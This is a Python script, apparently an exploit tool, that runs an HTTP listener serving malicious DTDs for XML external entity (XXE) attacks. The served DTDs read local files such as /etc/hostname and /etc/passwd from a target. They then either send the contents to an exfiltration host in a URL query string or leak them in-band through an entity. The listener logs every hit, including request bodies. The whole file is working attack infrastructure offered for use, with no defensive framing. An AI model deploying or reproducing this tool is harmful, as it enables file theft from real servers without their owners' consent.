import http.server
import socketserver
import datetime
import sys
import time

LOG = sys.argv[3] if len(sys.argv) > 3 else "/tmp/probe/listener.log"
EXFIL_HOST = sys.argv[1] if len(sys.argv) > 1 else "192.168.188.x"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 18080
DELAY = float(sys.argv[4]) if len(sys.argv) > 4 else 0.0

FILE_URI = sys.argv[5] if len(sys.argv) > 5 else "file:///etc/hostname"

# Classic blind-XXE exfil DTD: reads FILE_URI into a parameter entity and
# forwards it to the listener as the query string of the exfil URL.
EVIL_DTD = (
    "<!ENTITY % file SYSTEM \"" + FILE_URI + "\">\n"
    "<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://" + EXFIL_HOST + ":" +
    str(PORT) + "/LEAKED?data=%file;'>\">\n"
    "%eval;\n"
    "%exfil;\n"
)

# In-band variant: the external DTD declares a *general* entity whose value is
# built from the file content, so the OCI response itself carries the data.
EVIL_DTD_INBAND = (
    "<!ENTITY % file SYSTEM \"" + FILE_URI + "\">\n"
    "<!ENTITY % wrap \"<!ENTITY leak '%file;'>\">\n"
    "%wrap;\n"
)

# same in-band trick but for /etc/passwd (world readable, no quote chars)
EVIL_DTD_PASSWD = (
    "<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n"
    "<!ENTITY % wrap \"<!ENTITY leak '%file;'>\">\n"
    "%wrap;\n"
)


class H(http.server.BaseHTTPRequestHandler):
    def _log(self, method):
        with open(LOG, "a") as f:
            f.write("%s %s %s FROM %s HDRS=%s\n" % (
                datetime.datetime.now(), method, self.path, self.client_address,
                dict(self.headers)))
        print("HIT %s %s" % (method, self.path))

    def do_GET(self):
        self._log("GET")
        body = b""
        if self.path.startswith("/evil.dtd"):
            body = EVIL_DTD.encode()
        elif self.path.startswith("/evil2.dtd"):
            body = EVIL_DTD_INBAND.encode()
        elif self.path.startswith("/evil3.dtd"):
            body = EVIL_DTD_PASSWD.encode()
        if DELAY and body:
            # keep the peer socket open so the connection can be attributed to
            # a process on the target while the fetch is in flight
            time.sleep(DELAY)
        self.send_response(200)
        self.send_header("Content-Type", "application/xml-dtd")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0) or 0)
        body = self.rfile.read(n) if n else b""
        self._log("POST")
        with open(LOG, "a") as f:
            f.write("  BODY=%r\n" % (body[:400],))
        self.send_response(200)
        self.end_headers()

    def log_message(self, *a):
        pass


socketserver.TCPServer.allow_reuse_address = True
with socketserver.TCPServer(("0.0.0.0", PORT), H) as srv:
    srv.serve_forever()
